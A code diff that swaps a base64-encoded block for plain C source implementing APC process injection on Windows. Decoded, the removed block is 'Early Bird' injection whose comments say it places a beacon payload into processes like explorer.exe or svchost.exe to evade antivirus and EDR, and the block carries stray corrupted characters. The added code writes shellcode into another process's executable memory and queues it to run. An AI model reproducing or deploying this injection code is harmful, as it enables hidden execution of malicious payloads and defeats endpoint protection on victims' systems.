@@ -1,37 +1,79 @@
-I2luY2x1ZGUgPHdpbmRvd3MuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CgovLyBG
-b3gncyBOQVRJVkUgRWFybHkgQmlyZCBBUEMgSW5qZWN0aW9uCi8vIFRoaXMg
-aXMgdXNlZCB0byBpbmplY3Qgb3VyIGJlYWNvbiBwYXlsb2FkIGludG8gYSBs
-ZWdpdGltYXRlIHByb2Nlc3MgCi8vIChsaWtlIGV4cGxvcmVyLmV4ZSBvciBz
-dmNob3N0LmV4ZSkgYmVmb3JlIGl0IGZ1bGx5IGluaXRpYWxpemVzLAovLyBi
-eXBhc3NpbmcgbWFueSBBVi9FRFIgaGV1cmlzdGljcy4KCmJvb2wgSW5qZWN0
-VmlhQVBDKGNvbnN0IHdjaGFyX3QqIHRhcmdldFByb2Nlc3MsIHVuc2lnbmVk
-IGNoYXIqIHBheWxvYWQsIFNJWkVfVCBwYXlsb2FkU2l6ZSkgewogICAgcHJp
-bnRmKCJbK10gU3RhcnRpbmcgRWFybHkgQmlyZCBBUEMgSW5qZWN0aW9uIGlu
-dG8gJXdzLi4uXG4iLCB0YXJnZXRQcm9jZXNzKTsKCiAgICAvLyAx$.IENyZWF0
-ZSB0YXJnZXQgcHJvY2VzcyBpbiBzdXNwZW5kZWQgc3RhdGUKICAgIFNUQVJU
-VVBJTkZPVyBzaSA9IHsgc2l6ZW9mKHNpKSB9OwogICAgUFJPQ0VTU19JTkZP
-Uk1BVElPTiBwaTsKICAgIGlmICghQ3JlYXRlUHJvY2Vzc1coTlVMTCwgKExQ
-V1NUUil0YXJnZXRQcm9jZXNzLCBOVUxMLCBOVUxMLCBGQUxTRSwgQ1JFQVRF
-X1NVU1BFTkRFRCwgTlVMTCwgTlVMTCwgJnNpLCAmcGkpKSB7CiAgICAgICAg
-cmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8vIDIuIEFsbG9jYXRlIG1lbW9y
-eSBpbiB0YXJnZXQgcHJvY2VzcyAod291bGQgdXNlIE50QWxsb2NhdGVWaXJ0
-dWFsTWVtb3J5IHZpYSBzeXNjYWxsIGluIHYyLjApCiAgICBMUFZPSUQgcFJl
-bW90ZUNvZGUgPSBWaXJ0dWFsQWxsb2NFeChwaS5oUHJvY2VzcywgTlVMTCwg
-cGF5bG9hZFNpemUsIE1FTV9DT01NSVQgfCBNRU1fUkVTRVJWRSwgUEFHRV9F
-WEVDVVRFX1JFQURXUklURSk7CgogICAgLy8gMy4gV3JpdGUgcGF5bG9hZCAo
-d291bGQgdXNlIE50V3JpdGVWaXJ0dWFsTWVtb3J5IHZpYSBzeXNjYWxsIGlu
-IHYyLjApCiAgICBXcml0ZVByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIHBS
-ZW1vdGVDb2RlLCBwYXlsb2FkLCBwYXlsb2FkU2l6ZSwgTlVMTCk7CgogICAg
-Ly8gNC4gUXVldWUgQVBDICB0byB0aGUgc3VzcGVuZGVkIG1haW4gdGhyZWFk
-CiAgICBRdWV1ZVVzZXJBUEMoKFBBUFNGVU5DKXBSZW1vdGVDb2RlLCBwaS5o
-VGhyZWFkLCBOVUxMKTsKCiAgICAvLyA1LiBSZXN1bWUgdGhyZWFkIC0gcGF5
-bG9hZCBleGVjdXRlcwogICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwoK
-ICAgIHByaW50ZigiWyFdIFBheWxvYWQgaW5qZWN0ZWQgYW5kIGV4ZWN1dGlu
-ZyBpbiBwaWQgJWRcbiIsIHBpLmR3UHJvY2Vzc0lkKTsKICAgIENsb3NlSGFu
-ZGxlKHBpLmhUaHJlYWQpOwogICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3Mp
-OwogICAgcmV0dXJuIHRydWU7Cn0KCmludCBtYWluKCkgewogICAgdW5zaWdu
-ZWQgY2hhciBkdW1teVBheWxvYWRbXSA9IHsgMHg5MCwgMHg5MCwgMHg5MCwg
-MHhDMyB9OyAvLyBOT1AsIE5PUCwgTk9QLCBSRVQKICAgIEluamVjdFZpYUFQ
-QyhMIkM6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcbm90ZXBhZC5leGUiLCBkdW1t
-eVBheWxvYWQsIHNpemVvZihkdW1teVBheWxvYWQpKTsKICAgIHJldHVybiAw
-Owp9
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+
+// APC Injection Implementation
+// Injects shellcode into a remote process by queueing an Asynchronous Procedure Call (APC) to a thread.
+
+DWORD FindTargetThread(DWORD processId) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    THREADENTRY32 te;
+    te.dwSize = sizeof(THREADENTRY32);
+
+    if (Thread32First(hSnapshot, &te)) {
+        do {
+            if (te.th32OwnerProcessID == processId) {
+                CloseHandle(hSnapshot);
+                return te.th32ThreadID;
+            }
+        } while (Thread32Next(hSnapshot, &te));
+    }
+
+    CloseHandle(hSnapshot);
+    return 0;
+}
+
+bool InjectAPC(DWORD processId, PBYTE payload, SIZE_T payloadSize) {
+    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processId);
+    if (!hProcess) {
+        printf("[-] Failed to open process.\n");
+        return false;
+    }
+
+    PVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pRemoteMem) {
+        printf("[-] Failed to allocate memory in remote process.\n");
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    SIZE_T bytesWritten;
+    if (!WriteProcessMemory(hProcess, pRemoteMem, payload, payloadSize, &bytesWritten)) {
+        printf("[-] Failed to write payload to remote process.\n");
+        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    DWORD threadId = FindTargetThread(processId);
+    if (!threadId) {
+        printf("[-] Failed to find thread in target process.\n");
+        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
+    if (!hThread) {
+        printf("[-] Failed to open thread.\n");
+        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    if (!QueueUserAPC((PAPCFUNC)pRemoteMem, hThread, NULL)) {
+        printf("[-] Failed to queue APC.\n");
+        CloseHandle(hThread);
+        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    printf("[+] APC queued successfully. Payload will execute when the thread enters an alertable state.\n");
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return true;
+}
